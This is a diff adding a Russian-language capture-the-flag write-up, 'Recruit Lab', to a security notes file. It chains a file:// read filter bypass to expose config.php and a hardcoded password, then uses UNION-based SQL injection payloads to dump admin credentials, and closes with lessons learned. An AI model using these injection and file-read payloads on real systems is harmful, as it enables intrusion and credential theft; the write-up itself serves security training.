@@ -1270,3 +1270,57 @@ DevTools → Sources → ищешь `api`, `user`, `id`, `fetch`.
 - Проверка прав на сервере для каждого запроса.
 - Использование непредсказуемых идентификаторов (UUID) + проверка прав.
 - Не полагаться только на скрытие ID.
+
+### Recruit Lab
+Цель
+Получить доступ к панели HR, повысить привилегии до admin и забрать финальный флаг.
+Цепочка атаки
+SSRF → Weak Config → SQLi → Privilege Escalation
+Шаги
+1. Разведка
+- `http://TARGET/` - форма логина.
+- `http://TARGET/api.php` — FAQ, упоминает эндпоинт `/file.php?cv=<URL>`.
+2. SSRF - чтение файлов
+- `file.php?cv=http://example.com` → "Only local files are allowed".
+- `file.php?cv=file:///etc/passwd` → "Access denied".
+- `file.php?cv=file:///var/www/html/file.php` → исходник, показывающий фильтр:
+  - Требует префикс `file://`.
+  - Читает только пути внутри `/var/www/html`.
+
+3. Получение пароля HR
+- `file.php?cv=file:///var/www/html/config.php` → `$HR_PASSWORD = 'hrpassword123'`.
+
+4. Вход как HR
+- Login: `hr : hrpassword123`.
+- Первый флаг: `THM{LOGGED_IN_USER}`.
+
+5. Анализ dashboard.php (через SSRF)
+- `file.php?cv=file:///var/www/html/dashboard.php`.
+- Уязвимость: `$query = "SELECT * FROM candidates WHERE name LIKE '%$search%'"` — SQLi.
+- Флаги: `hr → /user.txt`, `admin → /admin.txt`.
+
+6. SQLi - определение колонок
+- `' UNION SELECT 1,2,3,4-- -` → 4 колонки.
+
+7. SQLi - имя базы
+- `' UNION SELECT 1,2,3,database()-- -` → `recruit_db`.
+
+8. SQLi - таблицы
+- `' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema='recruit_db'-- -`
+
+9. SQLi - колонки users
+- `' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -` → `id, username, password`.
+
+10. SQLi - креды админа
+- `' UNION SELECT 1,2,3,group_concat(username,':',password SEPARATOR '<br>') FROM users-- -`
+- Результат: `admin:admin@001admin`.
+
+11. Вход как admin
+- Login: `admin : admin@001admin`.
+- Получен ADMIN Flag.
+
+## Выводы
+- SSRF через фильтр `file://` + ограничение на `/var/www/html` — читаем исходники.
+- Пароли в комментариях `config.php` — частая ошибка.
+- SQLi в поле поиска + `information_schema` — быстрый путь к кредам.
+- Логика ролей в сессии: смена роли даёт доступ к другому флагу.
